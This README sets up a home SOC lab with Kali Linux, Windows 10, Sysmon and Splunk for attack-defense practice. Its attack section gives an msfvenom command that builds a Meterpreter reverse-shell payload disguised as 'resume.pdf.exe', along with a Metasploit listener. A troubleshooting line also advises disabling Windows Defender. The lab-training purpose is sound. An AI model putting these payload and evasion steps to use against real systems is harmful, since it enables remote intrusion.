# 🔧 SOC Home Lab: Attack-Defense Simulation

This project simulates a cybersecurity environment for offensive and defensive testing using Kali Linux, Windows 10, Sysmon, and Splunk. It allows practical exposure to attack execution, malware detection, and log monitoring.

---

## 🔁 Project Overview

| Component  | Role                   |
| ---------- | ---------------------- |
| Kali Linux | Attacker               |
| Windows 10 | Target                 |
| Splunk     | Log Monitoring (SIEM)  |
| Sysmon     | System Event Collector |

---

## 🔧 Tools & Requirements

| Requirement         | Description                      |
| ------------------- | -------------------------------- |
| RAM                 | 16GB+ for smooth VM operation    |
| Virtualization Tool | VMware Workstation / VirtualBox  |
| OS ISOs             | Windows 10 & Kali Linux          |
| Logging Tools       | Splunk, Sysmon                   |
| Internet            | Required for downloads & updates |

---

## 🗺️ Network Topology

```
[Kali Linux (Attacker)] ---> [Windows 10 VM (Target)] ---> [Splunk (SIEM/Logs)]
```

---

## ✅ Step-by-Step Setup

### ① Kali Linux Setup (Attacker)

```bash
# Update system
sudo apt update && sudo apt upgrade -y
```

### ② Windows 10 Setup (Target)

* Install Windows 10 ISO.
* Enable networking (NAT/Bridged/Internal).

### ③ Install Splunk on Windows 10

1. Download Splunk Free Edition.
2. Install Splunk and launch it.
3. Login using admin credentials.
4. Enable data input for logs.

### ④ Install Sysmon on Windows 10

```powershell
# Open PowerShell as Administrator
cd "C:\Users\<YourUser>\Downloads\sysmon"
.\sysmon64.exe -i sysmonconfig.xml

# Verify installation
Get-Process sysmon64
```

---

## 🔧 Malware Generation & Attack

### ⑤ Generate Payload (Kali Linux)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe -o resume.pdf.exe
```

### ⑥ Set Up Listener (Metasploit)

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Attacker_IP>
set LPORT 4444
exploit
```

* Transfer and execute `resume.pdf.exe` on the Windows target.
* Gain reverse shell:

```bash
meterpreter > sysinfo
```

---

## 🔍 Splunk Log Monitoring

```spl
# Search for security logs
index=main sourcetype=WinEventLog:Security
```

* Create alerts for event IDs:

  * Unauthorized access attempts
  * Process creation logs from Sysmon

---

## ⚠️ Troubleshooting Guide

| Issue                        | Resolution                                                  |
| ---------------------------- | ----------------------------------------------------------- |
| No Meterpreter session       | Disable Windows Defender, check IPs and ports, run as Admin |
| No logs in Splunk            | Ensure Sysmon is active, check Event Log configs            |
| Listener error in Metasploit | Restart handler, verify payload parameters                  |

---

## 🎯 Enhancements & Future Work

* ✈ Integrate ELK stack (Elasticsearch, Logstash, Kibana)
* ⚙️ Automate attack simulations using Python & cron
* 🚀 Implement Wazuh for advanced SIEM capabilities
* 🌟 Add Zeek & Suricata for network traffic analysis

---

## 📊 Comparative Table: Splunk vs ELK Stack

| Feature           | Splunk   | ELK Stack       |
| ----------------- | -------- | --------------- |
| Licensing         | Freemium | Open-source     |
| Log Visualization | Strong   | Very Strong     |
| Setup Complexity  | Easy     | Moderate-High   |
| Performance       | High     | Moderate-High   |
| Customization     | Limited  | Highly Flexible |

---

## 📝 How to Contribute

1. Fork the repository.
2. Create a branch: `git checkout -b feature/improvement`
3. Commit changes: `git commit -m "Added feature X"`
4. Push to branch: `git push origin feature/improvement`
5. Submit a pull request.

---

## 📄 Conclusion

This project demonstrates:

* How to build a realistic attack-defense cyber lab
* Craft and deliver malware payloads safely
* Detect and monitor threats using Splunk and Sysmon

> ✨ *Perfect for cybersecurity enthusiasts looking to learn real-world red-blue teaming skills in a virtual environment.*

---

## 📢 Stickers/Badges

![MIT License](https://img.shields.io/badge/license-MIT-green.svg)
![SOC Lab](https://img.shields.io/badge/SOC-Lab-blue.svg)
![Splunk](https://img.shields.io/badge/Tool-Splunk-yellow)
![Kali Linux](https://img.shields.io/badge/OS-Kali-red)
![Windows](https://img.shields.io/badge/OS-Windows-blue)

---

> 🚀 "Train in the lab. Hunt in the wild."

---
